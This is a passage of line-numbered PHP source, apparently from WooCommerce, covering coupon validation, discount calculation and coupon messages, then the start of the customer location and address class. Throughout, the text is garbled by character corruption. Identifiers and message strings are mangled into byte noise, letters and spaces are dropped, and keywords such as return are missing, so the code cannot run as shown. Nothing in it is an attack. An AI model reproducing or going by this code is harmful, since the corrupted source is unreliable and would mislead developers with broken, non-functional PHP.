() {

216  
$this
->
exşude_§Ë_™ems
 =ğ'yes' ? 
Œue
 : 
çl£
;

217 
	}
}

228 
public
 
funùiÚ
 
šc_u§ge_couÁ
Ğ
$u£d_by
 = '' ) {

229 
$this
->
u§ge_couÁ
++;

230 
upd©e_po¡_m‘a
Ğ
$this
->
id
, 'u§ge_couÁ', $this->
u§ge_couÁ
 );

232 iàĞ
	g$u£d_by
 ) {

233 
add_po¡_m‘a
Ğ
$this
->
id
, '_u£d_by', 
¡¹Şow”
Ğ
$u£d_by
 ) );

245 
public
 
funùiÚ
 
dü_u§ge_couÁ
Ğ
$u£d_by
 = '' ) {

246 
glob®
 
$wpdb
;

248 
	g$this
->
	gu§ge_couÁ
--;

249 
upd©e_po¡_m‘a
Ğ
$this
->
id
, 'u§ge_couÁ', $this->
u§ge_couÁ
 );

252 
	g$m‘a_id
 = 
$wpdb
->
g‘_v¬
Ğ$wpdb->
´•¬e
Ğ"SELECT m‘a_id FROM $wpdb->po¡m‘¨WHERE m‘a_key = '_u£d_by' AND m‘a_v®uğ% AND…o¡_id = %d LIMIT 1;", 
$u£d_by
, 
$this
->
id
 ) );

253 iàĞ
	g$m‘a_id
 ) {

254 
d–‘e_m‘ad©a_by_mid
Ğ'po¡', 
$m‘a_id
 );

264 
public
 
funùiÚ
 
	$g‘_”rÜ_mes§ge
() {

265  
$this
->
”rÜ_mes§ge
;

266 
	}
}

276 
public
 
funùiÚ
 
	$is_v®id
() {

278 
$”rÜ_code
 = 
nuÎ
;

279 
$v®id
 = 
Œue
;

280 
$”rÜ
 = 
çl£
;

282 iàĞ
$this
->
id
 ) {

285 iàĞ
$this
->
u§ge_lim™
 > 0 ) {

286 iàĞ
$this
->
u§ge_couÁ
 >ğ$this->
u§ge_lim™
 ) {

287 
$v®id
 = 
çl£
;

288 
$”rÜ_code
 = 
£lf
::
E_WC_COUPON_USAGE_LIMIT_REACHED
;

294 iàĞ
$this
->
u§ge_lim™_³r_u£r
 > 0 && 
	`is_u£r_logged_š
() ) {

295 
$u£d_by
 = (
¬¿y
è
	`g‘_po¡_m‘a
Ğ
$this
->
id
, '_used_by' );

296 
$u§ge_couÁ
 = Ğ
	`¬¿y_keys
Ğ
$u£d_by
, 
	`g‘_cu¼’t_u£r_id
() ) );

298 iàĞ
$u§ge_couÁ
 >ğ
$this
->
u§ge_lim™_³r_u£r
 ) {

299 
$v®id
 = 
çl£
;

300 
$”rÜ_code
 = 
£lf
::
E_WC_COUPON_USAGE_LIMIT_REACHED
;

305 iàĞ
$this
->
expœy_d©e
 ) {

306 iàĞ
	`cu¼’t_time
Ğ'time¡amp' ) > 
$this
->
expœy_d©e
 ) {

307 
$v®id
 = 
çl£
;

308 
$”rÜ_code
 = 
£lf
::
E_WC_COUPON_EXPIRED
;

313 iàĞ
$this
->
mšimum_amouÁ
 > 0 ) {

314 iàĞ
$this
->
mšimum_amouÁ
 > 
	`WC
()->
ÿ¹
->
subtÙ®
 ) {

315 
$v®id
 = 
çl£
;

316 
$”rÜ_code
 = 
£lf
::
E_WC_COUPON_MIN_SPEND_LIMIT_NOT_MET
;

321 iàĞĞ
$this
->
´oduù_ids
 ) > 0 ) {

322 
$v®id_fÜ_ÿ¹
 = 
çl£
;

323 iàĞĞ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
() ) > 0 ) {

324 
	`fÜ—ch
Ğ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
(è
as
 
$ÿ¹_™em_key
 => 
$ÿ¹_™em
 ) {

326 iàĞ
	`š_¬¿y
Ğ
$ÿ¹_™em
['´oduù_id'], 
$this
->
´oduù_ids
 ) || in_¬¿yĞ$ÿ¹_™em['v¬ŸtiÚ_id'], $this->´oduù_id è|| in_¬¿yĞ$ÿ¹_™em['d©a']->
	`g‘_·»Á
(), $this->product_ids ) )

327 
$v®id_fÜ_ÿ¹
 = 
Œue
;

330 iàĞ! 
$v®id_fÜ_ÿ¹
 ) {

331 
$v®id
 = 
çl£
;

332 
$”rÜ_code
 = 
£lf
::
E_WC_COUPON_NOT_APPLICABLE
;

337 iàĞĞ
$this
->
´oduù_ÿ‹gÜ›s
 ) > 0 ) {

338 
$v®id_fÜ_ÿ¹
 = 
çl£
;

339 iàĞĞ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
() ) > 0 ) {

340 
	`fÜ—ch
Ğ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
(è
as
 
$ÿ¹_™em_key
 => 
$ÿ¹_™em
 ) {

342 
$´oduù_ÿts
 = 
	`wp_g‘_po¡_‹rms
(
$ÿ¹_™em
['´oduù_id'], '´oduù_ÿt', 
	`¬¿y
("fields" => "ids"));

344 iàĞĞ
	`¬¿y_š‹r£ù
Ğ
$´oduù_ÿts
, 
$this
->
´oduù_ÿ‹gÜ›s
 ) ) > 0 )

345 
$v®id_fÜ_ÿ¹
 = 
Œue
;

348 iàĞ! 
$v®id_fÜ_ÿ¹
 ) {

349 
$v®id
 = 
çl£
;

350 
$”rÜ_code
 = 
£lf
::
E_WC_COUPON_NOT_APPLICABLE
;

355 iàĞ
$this
->
ty³
 != 'fixed_product' && $this->type != 'percent_product' ) {

358 iàĞĞ
$this
->
exşude_´oduù_ids
 ) > 0 ) {

359 
$v®id_fÜ_ÿ¹
 = 
Œue
;

360 iàĞĞ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
() ) > 0 ) {

361 
	`fÜ—ch
Ğ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
(è
as
 
$ÿ¹_™em_key
 => 
$ÿ¹_™em
 ) {

362 iàĞ
	`š_¬¿y
Ğ
$ÿ¹_™em
['´oduù_id'], 
$this
->
exşude_´oduù_ids
 ) || in_¬¿yĞ$ÿ¹_™em['v¬ŸtiÚ_id'], $this->exşude_´oduù_id è|| in_¬¿yĞ$ÿ¹_™em['d©a']->
	`g‘_·»Á
(), $this->exclude_product_ids ) ) {

363 
$v®id_fÜ_ÿ¹
 = 
çl£
;

367 iàĞ! 
$v®id_fÜ_ÿ¹
 ) {

368 
$v®id
 = 
çl£
;

369 
$”rÜ_code
 = 
£lf
::
E_WC_COUPON_NOT_APPLICABLE
;

374 iàĞ
$this
->
exşude_§Ë_™ems
 == 'yes' ) {

375 
$v®id_fÜ_ÿ¹
 = 
Œue
;

376 
$´oduù_ids_Ú_§Ë
 = 
	`wc_g‘_´oduù_ids_Ú_§Ë
();

377 iàĞĞ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
() ) > 0 ) {

378 
	`fÜ—ch
Ğ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
(è
as
 
$ÿ¹_™em_key
 => 
$ÿ¹_™em
 ) {

379 iàĞ
	`š_¬¿y
Ğ
$ÿ¹_™em
['´oduù_id'], 
$´oduù_ids_Ú_§Ë
, 
Œue
 ) || in_¬¿yĞ$ÿ¹_™em['v¬ŸtiÚ_id'], $´oduù_ids_Ú_§Ë,ruè|| in_¬¿yĞ$ÿ¹_™em['d©a']->
	`g‘_·»Á
(), $product_ids_on_sale,rue ) ) {

380 
$v®id_fÜ_ÿ¹
 = 
çl£
;

384 iàĞ! 
$v®id_fÜ_ÿ¹
 ) {

385 
$v®id
 = 
çl£
;

386 
$”rÜ_code
 = 
£lf
::
E_WC_COUPON_NOT_VALID_SALE_ITEMS
;

391 iàĞĞ
$this
->
exşude_´oduù_ÿ‹gÜ›s
 ) > 0 ) {

392 
$v®id_fÜ_ÿ¹
 = 
Œue
;

393 iàĞĞ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
() ) > 0 ) {

394 
	`fÜ—ch
Ğ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
(è
as
 
$ÿ¹_™em_key
 => 
$ÿ¹_™em
 ) {

396 
$´oduù_ÿts
 = 
	`wp_g‘_po¡_‹rms
Ğ
$ÿ¹_™em
['´oduù_id'], '´oduù_ÿt', 
	`¬¿y
( "fields" => "ids" ) );

398 iàĞĞ
	`¬¿y_š‹r£ù
Ğ
$´oduù_ÿts
, 
$this
->
exşude_´oduù_ÿ‹gÜ›s
 ) ) > 0 )

399 
$v®id_fÜ_ÿ¹
 = 
çl£
;

402 iàĞ! 
$v®id_fÜ_ÿ¹
 ) {

403 
$v®id
 = 
çl£
;

404 
$”rÜ_code
 = 
£lf
::
E_WC_COUPON_NOT_APPLICABLE
;

409 
$v®id
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_coupÚ_is_v®id', $v®id, 
$this
 );

411 iàĞ
$v®id
 ) {

412  
Œue
;

414 iàĞ
	`is_nuÎ
Ğ
$”rÜ_code
 ) )

415 
$”rÜ_code
 = 
£lf
::
E_WC_COUPON_INVALID_FILTERED
;

419 
$”rÜ_code
 = 
£lf
::
E_WC_COUPON_NOT_EXIST
;

422 iàĞ
$”rÜ_code
 )

423 
$this
->
”rÜ_mes§ge
 = $this->
	`g‘_coupÚ_”rÜ
Ğ
$”rÜ_code
 );

425  
çl£
;

426 
	}
}

433 
public
 
funùiÚ
 
	$is_v®id_fÜ_ÿ¹
() {

434 iàĞ
$this
->
ty³
 != 'fixed_cart' && $this->type != 'percent' )

435  
çl£
;

437  
Œue
;

438 
	}
}

446 
public
 
funùiÚ
 
	$is_v®id_fÜ_´oduù
Ğ
$´oduù
 ) {

447 iàĞ
$this
->
ty³
 != 'fixed_product' && $this->type != 'percent_product' )

448  
çl£
;

450 
$v®id
 = 
çl£
;

451 
$´oduù_ÿts
 = 
	`wp_g‘_po¡_‹rms
Ğ
$´oduù
->
id
, '´oduù_ÿt', 
	`¬¿y
( "fields" => "ids" ) );

454 iàĞĞ
$this
->
´oduù_ids
 ) > 0 ) {

456 iàĞ
	`š_¬¿y
Ğ
$´oduù
->
id
, 
$this
->
´oduù_ids
 ) || ( 
	`is£t
Ğ$´oduù->
v¬ŸtiÚ_id
 ) && in_¬¿yĞ$´oduù->v¬ŸtiÚ_id, $this->´oduù_id èè|| in_¬¿yĞ$´oduù->
	`g‘_·»Á
(), $this->product_ids ) )

457 
$v®id
 = 
Œue
;

460 } 
	`–£if
 ( Ğ
$this
->
´oduù_ÿ‹gÜ›s
 ) > 0 ) {

462 iàĞĞ
	`¬¿y_š‹r£ù
Ğ
$´oduù_ÿts
, 
$this
->
´oduù_ÿ‹gÜ›s
 ) ) > 0 )

463 
$v®id
 = 
Œue
;

467 
$v®id
 = 
Œue
;

471 iàĞĞ
$this
->
exşude_´oduù_ids
 ) > 0 )

472 iàĞ
	`š_¬¿y
Ğ
$´oduù
->
id
, 
$this
->
exşude_´oduù_ids
 ) || ( 
	`is£t
Ğ$´oduù->
v¬ŸtiÚ_id
 ) && in_¬¿yĞ$´oduù->v¬ŸtiÚ_id, $this->exşude_´oduù_id èè|| in_¬¿yĞ$´oduù->
	`g‘_·»Á
(), $this->exclude_product_ids ) )

473 
$v®id
 = 
çl£
;

476 iàĞĞ
$this
->
exşude_´oduù_ÿ‹gÜ›s
 ) > 0 )

477 iàĞĞ
	`¬¿y_š‹r£ù
Ğ
$´oduù_ÿts
, 
$this
->
exşude_´oduù_ÿ‹gÜ›s
 ) ) > 0 )

478 
$v®id
 = 
çl£
;

481 iàĞ
$this
->
exşude_§Ë_™ems
 == 'yes' ) {

482 
$´oduù_ids_Ú_§Ë
 = 
	`wc_g‘_´oduù_ids_Ú_§Ë
();

484 iàĞ
	`š_¬¿y
Ğ
$´oduù
->
id
, 
$´oduù_ids_Ú_§Ë
, 
Œue
 ) || ( 
	`is£t
Ğ$´oduù->
v¬ŸtiÚ_id
 ) && in_¬¿yĞ$´oduù->v¬ŸtiÚ_id, $´oduù_ids_Ú_§Ë,ruèè|| in_¬¿yĞ$´oduù->
	`g‘_·»Á
(), $product_ids_on_sale,rue ) )

485 
$v®id
 = 
çl£
;

488  
	`­¶y_f‹rs
Ğ'woocomm”û_coupÚ_is_v®id_fÜ_´oduù', 
$v®id
, 
$´oduù
, 
$this
 );

489 
	}
}

499 
public
 
funùiÚ
 
	$g‘_discouÁ_amouÁ
Ğ
$discouÁšg_amouÁ
, 
$ÿ¹_™em
 = 
nuÎ
, 
$sšgË
 = 
çl£
 ) {

500 
$discouÁ
 = 0;

502 iàĞ
$this
->
ty³
 == 'fixed_product') {

504 
$discouÁ
 = 
$discouÁšg_amouÁ
 < 
$this
->
amouÁ
 ? $discounting_amount : $this->amount;

507 iàĞ! 
$sšgË
 && ! 
	`is_nuÎ
Ğ
$ÿ¹_™em
 ) ) {

509 
$discouÁ
 = $discouÁ * 
$ÿ¹_™em
['quantity'];

512 } 
	`–£if
 ( 
$this
->
ty³
 == 'percent_product' || $this->type == 'percent' ) {

514 
$discouÁ
 = 
	`round
ĞĞ
$discouÁšg_amouÁ
 / 100 ) * 
$this
->
amouÁ
, 
	`WC
()->
ÿ¹
->
dp
 );

516 } 
	`–£if
 ( 
$this
->
ty³
 == 'fixed_cart' ) {

517 iàĞ! 
	`is_nuÎ
Ğ
$ÿ¹_™em
 ) ) {

525 
$discouÁ_³rûÁ
 = 0;

527 iàĞ
	`WC
()->
ÿ¹
->
subtÙ®_ex_x
 ) {

528 
$discouÁ_³rûÁ
 = ( 
$ÿ¹_™em
['d©a']->
	`g‘_´iû_exşudšg_x
(è* $ÿ¹_™em['quªt™y'] ) / 
	`WC
()->
ÿ¹
->
subtÙ®_ex_x
;

531 
$discouÁ
 = 
	`mš
ĞĞ
$this
->
amouÁ
 * 
$discouÁ_³rûÁ
 ) / 
$ÿ¹_™em
['quªt™y'], 
$discouÁšg_amouÁ
 );

533 
$discouÁ
 = 
	`mš
Ğ
$this
->
amouÁ
, 
$discouÁšg_amouÁ
 );

538 iàĞ
	`š_¬¿y
Ğ
$this
->
ty³
, 
	`¬¿y
Ğ'³rûÁ_´oduù', 'fixed_´oduù' ) ) && ! 
	`is_nuÎ
Ğ
$ÿ¹_™em
 ) ) {

539 
$qty
 = 
	`em±y
Ğ
$this
->
lim™_u§ge_to_x_™ems
 ) ? 
$ÿ¹_™em
['quªt™y'] : 
	`mš
( $this->limit_usage_to_x_items, $cart_item['quantity'] );

541 iàĞ
$sšgË
 ) {

542 
$discouÁ
 = ( $discouÁ * 
$qty
 ) / 
$ÿ¹_™em
['quantity'];

544 
$discouÁ
 = ( $discouÁ / 
$ÿ¹_™em
['quªt™y'] ) * 
$qty
;

548  
	`­¶y_f‹rs
Ğ'woocomm”û_coupÚ_g‘_discouÁ_amouÁ', 
$discouÁ
, 
$discouÁšg_amouÁ
, 
$ÿ¹_™em
, 
$sšgË
, 
$this
 );

549 
	}
}

559 
public
 
funùiÚ
 
	$add_coupÚ_mes§ge
Ğ
$msg_code
 ) {

561 iàĞ
$msg_code
 < 200 )

562 
	`wc_add_nÙiû
Ğ
$this
->
	`g‘_coupÚ_”rÜ
Ğ
$msg_code
 ), 'error' );

564 
	`wc_add_nÙiû
Ğ
$this
->
	`g‘_coupÚ_mes§ge
Ğ
$msg_code
 ) );

565 
	}
}

574 
public
 
funùiÚ
 
	$g‘_coupÚ_mes§ge
Ğ
$msg_code
 ) {

576  
$msg_code
 ) {

577 
£lf
::
WC_COUPON_SUCCESS
 :

578 
$msg
 = 
	`__
( 'Coupon code‡pplied successfully.', 'woocommerce' );

580 
£lf
::
WC_COUPON_REMOVED
 :

581 
$msg
 = 
	`__
( 'Coupon code„emoved successfully.', 'woocommerce' );

584 
$msg
 = '';

588  
	`­¶y_f‹rs
Ğ'woocomm”û_coupÚ_mes§ge', 
$msg
, 
$msg_code
, 
$this
 );

589 
	}
}

598 
public
 
funùiÚ
 
	$g‘_coupÚ_”rÜ
Ğ
$”r_code
 ) {

600  
$”r_code
 ) {

601 
£lf
::
E_WC_COUPON_INVALID_FILTERED
:

602 
$”r
 = 
	`__
( 'Coupon is‚ot valid.', 'woocommerce' );

604 
£lf
::
E_WC_COUPON_NOT_EXIST
:

605 
$”r
 = 
	`__
( 'Coupon does‚otƒxist!', 'woocommerce' );

607 
£lf
::
E_WC_COUPON_INVALID_REMOVED
:

608 
$”r
 = 
	`¥rštf
Ğ
	`__
Ğ'SÜry, iˆ£em thcoupÚ "%s" i šv®id - iˆha now b“À»moved from you¸Üd”.', 'woocomm”û' ), 
$this
->
code
 );

610 
£lf
::
E_WC_COUPON_NOT_YOURS_REMOVED
:

611 
$”r
 = 
	`¥rštf
Ğ
	`__
Ğ'SÜry, iˆ£em thcoupÚ "%s" i nÙ your - iˆha now b“À»moved from you¸Üd”.', 'woocomm”û' ), 
$this
->
code
 );

613 
£lf
::
E_WC_COUPON_ALREADY_APPLIED
:

614 
$”r
 = 
	`__
( 'Coupon code‡lready‡pplied!', 'woocommerce' );

616 
£lf
::
E_WC_COUPON_ALREADY_APPLIED_INDIV_USE_ONLY
:

617 
$”r
 = 
	`¥rštf
Ğ
	`__
Ğ'SÜry, coupÚ "%s" ha ®»ady b“À­¶›d‡nd cªnÙ bu£d iÀcÚjunùiÚ w™h oth” coupÚs.', 'woocomm”û' ), 
$this
->
code
 );

619 
£lf
::
E_WC_COUPON_USAGE_LIMIT_REACHED
:

620 
$”r
 = 
	`__
( 'Coupon usage†imit has been„eached.', 'woocommerce' );

622 
£lf
::
E_WC_COUPON_EXPIRED
:

623 
$”r
 = 
	`__
( 'This coupon hasƒxpired.', 'woocommerce' );

625 
£lf
::
E_WC_COUPON_MIN_SPEND_LIMIT_NOT_MET
:

626 
$”r
 = 
	`¥rštf
Ğ
	`__
Ğ'Thmšimum s³nd fÜhi coupÚ i %s.', 'woocomm”û' ), 
	`wc_´iû
Ğ
$this
->
mšimum_amouÁ
 ) );

628 
£lf
::
E_WC_COUPON_NOT_APPLICABLE
:

629 
$”r
 = 
	`__
( 'Sorry,his coupon is‚ot‡pplicableo your cart contents.', 'woocommerce' );

631 
£lf
::
E_WC_COUPON_NOT_VALID_SALE_ITEMS
:

632 
$”r
 = 
	`__
( 'Sorry,his coupon is‚ot valid for sale items.', 'woocommerce' );

635 
$”r
 = '';

639  
	`­¶y_f‹rs
Ğ'woocomm”û_coupÚ_”rÜ', 
$”r
, 
$”r_code
, 
$this
 );

640 
	}
}

651 
public
 
funùiÚ
 
	$g‘_g’”ic_coupÚ_”rÜ
Ğ
$”r_code
 ) {

653  
$”r_code
 ) {

654 
£lf
::
E_WC_COUPON_NOT_EXIST
:

655 
$”r
 = 
	`__
( 'Coupon does‚otƒxist!', 'woocommerce' );

657 
£lf
::
E_WC_COUPON_PLEASE_ENTER
:

658 
$”r
 = 
	`__
( 'Pleaseƒnter‡ coupon code.', 'woocommerce' );

661 
$”r
 = '';

666  
	`­¶y_f‹rs
Ğ'woocomm”û_coupÚ_”rÜ', 
$”r
, 
$”r_code
, 
nuÎ
 );

667 
	}
}

	@includes/class-wc-customer.php

1 <?
php


13 şas 
	cWC_Cu¡om”
 {

16 
´Ùeùed
 
	m$_d©a
;

19 
´iv©e
 
	m$_chªged
 = 
çl£
;

27 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

29 iàĞ
	`em±y
Ğ
	`WC
()->
£ssiÚ
->
cu¡om”
 ) ) {

31 
$deçuÉ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_cu¡om”_deçuÉ_loÿtiÚ', 
	`g‘_İtiÚ
( 'woocommerce_default_country' ) );

33 iàĞ
	`¡r¡r
Ğ
$deçuÉ
, ':' ) ) {

34 
	`li¡
Ğ
$couÁry
, 
$¡©e
 ) = 
	`ex¶ode
Ğ':', 
$deçuÉ
 );

36 
$couÁry
 = 
$deçuÉ
;

37 
$¡©e
 = '';

40 
$this
->
_d©a
 = 
	`¬¿y
(

41 'couÁry' => 
	`esc_html
Ğ
$couÁry
 ),

47 'shpšg_couÁry' => 
	`esc_html
Ğ
$couÁry
 ),

53 'is_v©_exem±' => 
çl£
,

54 'ÿlcuÏ‹d_shpšg' => 
çl£


59 
$this
->
_d©a
 = 
	`WC
()->
£ssiÚ
->
cu¡om”
;

64 
	`add_aùiÚ
Ğ'shutdown', 
	`¬¿y
Ğ
$this
, 'save_data' ), 10 );

73 
public
 
funùiÚ
 
	$§ve_d©a
() {

74 iàĞ
$this
->
_chªged
 )

75 
$GLOBALS
['woocomm”û']->
£ssiÚ
->
cu¡om”
 = 
$this
->
_d©a
;

76 
	}
}

84 
public
 
funùiÚ
 
	$__is£t
Ğ
$´İ”ty
 ) {

85  
	`is£t
Ğ
$this
->
_d©a
[ 
$´İ”ty
 ] );

86 
	}
}

95 
public
 
funùiÚ
 
	$__g‘
Ğ
$´İ”ty
 ) {

96  
	`is£t
Ğ
$this
->
_d©a
[ 
$´İ”ty
 ] ) ? $this->_d©a[ $´İ”ty ] : 
nuÎ
;

97 
	}
}

107 
public
 
funùiÚ
 
	$__£t
Ğ
$´İ”ty
, 
$v®ue
 ) {

108 
$this
->
_d©a
[ 
$´İ”ty
 ] = 
$v®ue
;

109 
$this
->
_chªged
 = 
Œue
;

110 
	}
}

118 
public
 
funùiÚ
 
	$has_ÿlcuÏ‹d_shpšg
() {

119  ( ! 
	`em±y
Ğ
$this
->
ÿlcuÏ‹d_shpšg
 ) ) ? 
Œue
 : 
çl£
;

120 
	}
}

129 
public
 
funùiÚ
 
	$£t_to_ba£
() {

130 
$deçuÉ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_cu¡om”_deçuÉ_loÿtiÚ', 
	`g‘_İtiÚ
('woocommerce_default_country') );

131 iàĞ
	`¡r¡r
Ğ
$deçuÉ
, ':' ) ) {

132 
	`li¡
Ğ
$couÁry
, 
$¡©e
 ) = 
	`ex¶ode
Ğ':', 
$deçuÉ
 );

134 
$couÁry
 = 
$deçuÉ
;

135 
$¡©e
 = '';

137 
$this
->
couÁry
 = 
$couÁry
;

138 
$this
->
¡©e
 = 
$¡©e
;

139 
$this
->
po¡code
 = '';

140 
$this
->
c™y
 = '';

141 
	}
}

150 
public
 
funùiÚ
 
	$£t_shpšg_to_ba£
() {

151 
$deçuÉ
 = 
	`g‘_İtiÚ
('woocommerce_default_country');

152 iàĞ
	`¡r¡r
Ğ
$deçuÉ
, ':' ) ) {

153 
	`li¡
Ğ
$couÁry
, 
$¡©e
 ) = 
	`ex¶ode
Ğ':', 
$deçuÉ
 );

155 
$couÁry
 = 
$deçuÉ
;

156 
$¡©e
 = '';

158 
$this
->
shpšg_couÁry
 = 
$couÁry
;

159 
$this
->
shpšg_¡©e
 = 
$¡©e
;

160 
$this
->
shpšg_po¡code
 = '';

161 
$this
->
shpšg_c™y
 = '';

162 
	}
}

171 
public
 
funùiÚ
 
	$is_cu¡om”_outside_ba£
() {

172 
	`li¡
Ğ
$couÁry
, 
$¡©e
, 
$po¡code
, 
$c™y
 ) = 
$this
->
	`g‘_xabË_add»ss
();

174 iàĞ
$couÁry
 ) {

176 
$deçuÉ
 = 
	`g‘_İtiÚ
('woocommerce_default_country');

178 iàĞ
	`¡r¡r
Ğ
$deçuÉ
, ':' ) ) {

179 
	`li¡
Ğ
$deçuÉ_couÁry
, 
$deçuÉ_¡©e
 ) = 
	`ex¶ode
Ğ':', 
$deçuÉ
 );

181 
$deçuÉ_couÁry
 = 
$deçuÉ
;

182 
$deçuÉ_¡©e
 = '';

185 iàĞ
$deçuÉ_couÁry
 !=ğ
$couÁry
 )  
Œue
;

186 iàĞ
$deçuÉ_¡©e
 && $deçuÉ_¡©!=ğ
$¡©e
 )  
Œue
;

189  
çl£
;

190 
	}
}

198 
funùiÚ
 
	$is_·yšg_cu¡om”
Ğ
$u£r_id
 ) {

199  '1' ==ğ
	`g‘_u£r_m‘a
Ğ
$u£r_id
, '·yšg_cu¡om”', 
Œue
 );

200 
	}
}

209 
public
 
funùiÚ
 
	$is_v©_exem±
() {

210  ( ! 
	`em±y
Ğ
$this
->
is_v©_exem±
 ) ) ? 
Œue
 : 
çl£
;

211 
	}
}

220 
public
 
funùiÚ
 
	$g‘_¡©e
() {

221 iàĞ
	`is£t
Ğ
$this
->
¡©e
 ) )  $this->state;

222 
	}
}

231 
public
 
funùiÚ
 
	$g‘_couÁry
() {

232 iàĞ
	`is£t
Ğ
$this
->
couÁry
 ) )  $this->country;

233 
	}
}

242 
public
 
funùiÚ
 
	$g‘_po¡code
() {

243 iàĞ
	`is£t
Ğ
$this
->
po¡code
 ) && $this->po¡cod!=ğ
çl£
 )

244  
	`wc_fÜm©_po¡code
Ğ
$this
->
po¡code
, $this->
	`g‘_couÁry
() );

245 
	}
}

254 
public
 
funùiÚ
 
	$g‘_c™y
() {

255 iàĞ
	`is£t
Ğ
$this
->
c™y
 ) )  $this->city;

256 
	}
}

264 
public
 
funùiÚ
 
	$g‘_add»ss
() {

265 iàĞ
	`is£t
Ğ
$this
->
add»ss
 ) )  $this->address;

266 
	}
}

274 
public
 
funùiÚ
 
	$g‘_add»ss_2
() {

275 iàĞ
	`is£t
Ğ
$this
->
add»ss_2
 ) )  $this->address_2;

276 
	}
}

284 
public
 
funùiÚ
 
	$g‘_shpšg_¡©e
() {

285 iàĞ
	`is£t
Ğ
$this
->
shpšg_¡©e
 ) )  $this->shipping_state;

286 
	}
}

295 
public
 
funùiÚ
 
	$g‘_shpšg_couÁry
() {

296 iàĞ
	`is£t
Ğ
$this
->
shpšg_couÁry
 ) )  $this->shipping_country;

297 
	}
}

306 
public
 
funùiÚ
 
	$g‘_shpšg_po¡code
() {

307 iàĞ
	`is£t
Ğ
$this
->
shpšg_po¡code
 ) )

308  
	`wc_fÜm©_po¡code
Ğ
$this
->
shpšg_po¡code
, $this->
	`g‘_shpšg_couÁry
() );

309 
	}
}

318 
public
 
funùiÚ
 
	$g‘_shpšg_c™y
() {

319 iàĞ
	`is£t
Ğ
$this
->
shpšg_c™y
 ) )  $this->shipping_city;

320 
	}
}

328 
public
 
funùiÚ
 
	$g‘_shpšg_add»ss
() {

329 iàĞ
	`is£t
Ğ
$this
->
shpšg_add»ss
 ) )  $this->shipping_address;

330 
	}
}

338 
public
 
funùiÚ
 
	$g‘_shpšg_add»ss_2
() {

339 iàĞ
	`is£t
Ğ
$this
->
shpšg_add»ss_2
 ) )  $this->shipping_address_2;

340 
	}
}

348 
public
 
funùiÚ
 
	$g‘_xabË_add»ss
() {

349 
$x_ba£d_Ú
 = 
	`g‘_İtiÚ
( 'woocommerce_tax_based_on' );

352 iàĞ
	`­¶y_f‹rs
Ğ'woocomm”û_­¶y_ba£_x_fÜ_loÿl_pickup', 
Œue
 ) =ğŒu&& Ğ
	`¬¿y_š‹r£ù
Ğ
	`WC
()->
£ssiÚ
->
	`g‘
Ğ'cho£n_shpšg_m‘hods', 
	`¬¿y
Ğ
	`g‘_İtiÚ
( 'woocommerce_default_shipping_method' ) ) ),‡pply_filters( 'woocommerce_local_pickup_methods',‡rray( 'local_pickup' ) ) ) ) > 0 ) {

353 
$x_ba£d_Ú
 = 'base';

356 iàĞ
$x_ba£d_Ú
 == 'base' ) {

358 
$deçuÉ
 = 
	`g‘_İtiÚ
( 'woocommerce_default_country' );

359 iàĞ
	`¡r¡r
Ğ
$deçuÉ
, ':' ) ) {

360 
	`li¡
Ğ
$couÁry
, 
$¡©e
 ) = 
	`ex¶ode
Ğ':', 
$deçuÉ
 );

362 
$couÁry
 = 
$deçuÉ
;

363 
$¡©e
 = '';

366 
$po¡code
 = '';

367 
$c™y
 = '';

369 } 
	`–£if
 ( 
$x_ba£d_Ú
 == 'billing' ) {

371 
$couÁry
 = 
$this
->
	`g‘_couÁry
();

372 
$¡©e
 = 
$this
->
	`g‘_¡©e
();

373 
$po¡code
 = 
$this
->
	`g‘_po¡code
();

374 
$c™y
 = 
$this
->
	`g‘_c™y
();

378 
$couÁry
 = 
$this
->
	`g‘_shpšg_couÁry
();

379 
$¡©e
 = 
$this
->
	`g‘_shpšg_¡©e
();

380 
$po¡code
 = 
$this
->
	`g‘_shpšg_po¡code
();

381 
$c™y
 = 
$this
->
	`g‘_shpšg_c™y
();

385  
	`­¶y_f‹rs
Ğ'woocomm”û_cu¡om”_xabË_add»ss', 
	`¬¿y
Ğ
$couÁry
, 
$¡©e
, 
$po¡code
, 
$c™y
 ) );

386 
	}
}

399 
public
 
funùiÚ
 
£t_loÿtiÚ
Ğ
$couÁry
, 
$¡©e
, 
$po¡code
 = '', 
$c™y
 = '' ) {

400 
$this
->
couÁry
 = 
$couÁry
;

401 
	g$this
->
	g¡©e
 = 
$¡©e
;

402 
	g$this
->
	gpo¡code
 = 
$po¡code
;

403 
	g$this
->
	gc™y
 = 
$c™y
;

414 
public
 
funùiÚ
 
	$£t_couÁry
Ğ
$couÁry
 ) {

415 
$this
->
couÁry
 = 
$couÁry
;

416 
	}
}

426 
public
 
funùiÚ
 
	$£t_¡©e
Ğ
$¡©e
 ) {

427 
$this
->
¡©e
 = 
$¡©e
;

428 
	}
}

438 
public
 
funùiÚ
 
	$£t_po¡code
Ğ
$po¡code
 ) {

439 
$this
->
po¡code
 = 
$po¡code
;

440 
	}
}

450 
public
 
funùiÚ
 
	$£t_c™y
Ğ
$c™y
 ) {

451 
$this
->
c™y
 = 
$c™y
;

452 
	}
}

461 
public
 
funùiÚ
 
	$£t_add»ss
Ğ
$add»ss
 ) {

462 
$this
->
add»ss
 = 
$add»ss
;

463 
	}
}

472 
public
 
funùiÚ
 
	$£t_add»ss_2
Ğ
$add»ss_2
 ) {

473 
$this
->
add»ss_2
 = 
$add»ss_2
;

474 
	}
}

486 
public
 
funùiÚ
 
£t_shpšg_loÿtiÚ
Ğ
$couÁry
, 
$¡©e
 = '', 
$po¡code
 = '', 
$c™y
 = '' ) {

487 
$this
->
shpšg_couÁry
 = 
$couÁry
;

488 
	g$this
->
	gshpšg_¡©e
 = 
$¡©e
;

489 
	g$this
->
	gshpšg_po¡code
 = 
$po¡code
;

490 
	g$this
->
	gshpšg_c™y
 = 
